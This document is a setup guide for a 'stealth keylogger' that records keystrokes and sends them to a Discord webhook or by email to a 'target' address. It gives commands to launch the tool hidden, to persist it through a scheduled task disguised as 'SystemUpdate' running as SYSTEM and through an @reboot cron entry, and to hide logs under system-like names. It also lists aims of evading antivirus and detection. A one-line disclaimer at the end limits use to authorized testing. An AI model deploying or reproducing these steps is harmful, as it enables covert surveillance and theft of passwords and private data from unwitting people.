# Stealth Keylogger Setup Guide

Complete setup instructions for deploying and configuring the stealth keylogger system.

## Prerequisites

### System Requirements
- **Operating System**: Windows 10/11 (primary), Linux/macOS (experimental)
- **Python Version**: 3.7 or higher
- **Permissions**: Administrative access (recommended)
- **Network**: Internet access for Discord webhook

### Software Dependencies
- Python 3.7+
- pip package manager
- Git (for cloning repository)

## Installation Steps

### 1. Clone Repository
```bash
git clone https://github.com/yourusername/stealth-keylogger.git
cd stealth-keylogger
```

### 2. Install Python Dependencies
```bash
pip install -r requirements.txt
```

### 3. Verify Installation
```bash
python -c "import pynput, requests; print('Dependencies installed successfully')"
```

## Configuration

### Discord Webhook Setup

#### Step 1: Create Discord Server
1. Open Discord and create a new server
2. Create a dedicated channel for keylogger data
3. Ensure you have "Manage Webhooks" permission

#### Step 2: Generate Webhook
1. Right-click on the channel
2. Select "Edit Channel"
3. Go to "Integrations" tab
4. Click "Create Webhook"
5. Copy the webhook URL

#### Step 3: Update Configuration
Edit `stealth_keylogger.py` and update:
```python
self.webhook_url = "YOUR_DISCORD_WEBHOOK_URL_HERE"
```
Replace with your actual webhook URL.

### Email Configuration (Optional)

#### Gmail Setup
1. Enable 2-factor authentication
2. Generate App Password
3. Update configuration in `stealth_keylogger.py`:
```python
self.email_config = {
    'smtp_server': 'smtp.gmail.com',
    'smtp_port': 587,
    'sender_email': 'your_email@gmail.com',
    'sender_password': 'your_app_password',
    'receiver_email': 'target@domain.com'
}
```

## Deployment

### Local Testing
```bash
# Quick test
python run_keylogger.py

# Direct execution
python stealth_keylogger.py

# Programmatic usage
python -c "
from stealth_keylogger import StealthKeylogger
kl = StealthKeylogger()
kl.start()
import time
time.sleep(10)
kl.stop()
print('Test completed')
"
```

### Production Deployment

#### Method 1: Direct Execution
```bash
python stealth_keylogger.py
```

#### Method 2: Background Service
```bash
# Windows (PowerShell)
Start-Process python -ArgumentList "stealth_keylogger.py" -WindowStyle Hidden

# Linux/macOS
nohup python stealth_keylogger.py > /dev/null 2>&1 &
```

#### Method 3: Scheduled Task
```bash
# Windows Task Scheduler
schtasks /create /tn "SystemUpdate" /tr "python stealth_keylogger.py" /sc onstart /ru SYSTEM

# Linux Cron
echo "@reboot cd /path/to/keylogger && python stealth_keylogger.py" | crontab -
```

## Testing

### Basic Functionality Test
1. Start the keylogger
2. Type in any application
3. Check Discord channel for data
4. Verify local log files

### Stealth Test
1. Check Task Manager for process name
2. Verify hidden directory creation
3. Test file hiding attributes
4. Confirm console window hiding

### Exfiltration Test
1. Type 50+ keystrokes
2. Verify Discord transmission
3. Check email delivery (if configured)
4. Monitor transmission timing

## Monitoring

### Real-time Status
```python
from stealth_keylogger import StealthKeylogger

kl = StealthKeylogger()
kl.start()

# Monitor status
while True:
    stats = kl.get_stats()
    print(f"Keystrokes: {stats['total_keystrokes']}")
    print(f"Running: {stats['is_running']}")
    time.sleep(30)
```

### Log File Monitoring
```bash
# Windows
Get-Content "C:\Users\%USERNAME%\AppData\Local\Microsoft\Windows\Update\system32.log" -Tail 10

# Linux
tail -f ~/.config/system32.log
```

## Troubleshooting

### Common Issues

#### Issue 1: Permission Denied
**Symptoms**: File access errors, directory creation failures
**Solution**: Run as administrator or check file permissions

#### Issue 2: Discord Transmission Failed
**Symptoms**: No data in Discord channel, transmission errors
**Solution**: 
- Verify webhook URL
- Check internet connectivity
- Confirm Discord permissions

#### Issue 3: Keystrokes Not Captured
**Symptoms**: Empty log files, no data transmission
**Solution**:
- Verify pynput installation
- Check for antivirus interference
- Confirm Python version compatibility

#### Issue 4: Process Detection
**Symptoms**: Visible in Task Manager, console window visible
**Solution**:
- Check stealth configuration
- Verify Windows API calls
- Confirm process hiding implementation

### Debug Mode
Enable verbose logging by modifying exception handlers:
```python
except Exception as e:
    print(f"DEBUG: {e}")  # Add this line
    return False
```

### Performance Optimization
- Adjust transmission intervals
- Modify keystroke thresholds
- Optimize data compression
- Configure error handling

## Security Considerations

### Anti-Detection Measures
- Process name randomization
- File path obfuscation
- Network traffic encryption
- Behavioral analysis evasion

### Data Protection
- Local encryption
- Secure transmission
- Access control
- Audit logging

### Legal Compliance
- Obtain proper authorization
- Follow local regulations
- Document usage purpose
- Maintain audit trails

## Maintenance

### Regular Tasks
- Monitor log file sizes
- Check transmission success rates
- Update dependencies
- Review security measures

### Backup Procedures
- Archive log files
- Export configuration
- Document changes
- Test recovery procedures

## Support

### Documentation
- README.md - Project overview
- SETUP.md - This setup guide
- Code comments - Implementation details

### Community
- GitHub Issues
- Discussion forums
- Security communities
- Professional networks

### Professional Support
- Security consultants
- Penetration testers
- Legal advisors
- Compliance experts

---

**Remember**: This tool is for authorized security testing only. Always ensure compliance with applicable laws and regulations.
